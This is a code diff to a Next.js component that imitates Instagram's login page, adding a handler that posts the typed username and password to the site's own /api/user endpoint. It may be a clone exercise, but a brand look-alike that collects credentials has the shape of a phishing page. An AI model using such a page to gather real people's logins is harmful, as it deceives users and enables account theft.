@@ -1,8 +1,23 @@
-import React from 'react';
+'use client';
+import React, { useState } from 'react';
 
 import Link from 'next/link';
 
 const InstagramLogin = () => {
+  const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    const res = await fetch('/api/user', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ username, password })
+    });
+    const data = await res.json();
+  }
   return (
     <div className="h-screen flex items-center justify-center">
       <div className="mx-auto max-w-[935px] my-auto text-[#868585] pb-5 px-4">
@@ -10,9 +25,9 @@ const InstagramLogin = () => {
           {/* SMARTPHONE SECTION */}
           <article className="hidden md:block -ml-[90px] relative">
             <div className="absolute top-[25px] left-[160px] animate-fade">
-              <img className="absolute fade w-[250px]"  src="img/screen1.png" alt="screen1" />
-              <img className="absolute fade w-[250px]"  src="img/screen2.png" alt="screen2" />
-              <img className="absolute fade w-[250px]"  src="img/screen3.png" alt="screen3" />
+              <img className="absolute fade w-[250px]" src="img/screen1.png" alt="screen1" />
+              <img className="absolute fade w-[250px]" src="img/screen2.png" alt="screen2" />
+              <img className="absolute fade w-[250px]" src="img/screen3.png" alt="screen3" />
             </div>
             <img src="img/smartphones.png" alt="smartphones" />
           </article>
@@ -23,11 +38,13 @@ const InstagramLogin = () => {
               <img src="img/logo.png" alt="Instagram Logo" className="w-[170px] mx-auto" />
             </div>
 
-            <form className="flex flex-col items-center w-[355px] py-5 bg-white border border-[#dbdbdb] border-t-0">
+            <form onSubmit={handleSubmit} className="flex flex-col items-center w-[355px] py-5 bg-white border border-[#dbdbdb] border-t-0">
               <input
-                type="email"
+                type="text"
                 name="username"
                 id="username"
+                value={username}
+                onChange={(e) => setUsername(e.target.value)}
                 placeholder="Phone, username or email"
                 className="w-[280px] p-[13px_4px] mb-1.5 text-xs border border-[#dbdbdb] rounded bg-[#fafafa]"
               />
@@ -36,14 +53,13 @@ const InstagramLogin = () => {
                 name="password"
                 id="password"
                 placeholder="Password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
                 className="w-[280px] p-[13px_4px] mb-1.5 text-xs border border-[#dbdbdb] rounded bg-[#fafafa]"
               />
-              <input
-                type="submit"
-                value="Log In"
-                className="w-[280px] mt-2 px-2.5 py-1.5 bg-[#8cd6ec] text-white font-medium rounded hover:bg-[#63c7e6] cursor-pointer"
-              />
-
+              <button type='submit'  className="w-[280px] mt-2 px-2.5 py-1.5 bg-[#8cd6ec] text-white font-medium rounded hover:bg-[#63c7e6] cursor-pointer">
+                Log In
+              </button>
               <div className="flex items-center my-4 text-sm font-bold text-[#868585]">
                 <div className="w-[110px] h-px bg-[#dbdbdb] mx-4" />
                 <p>OR</p>
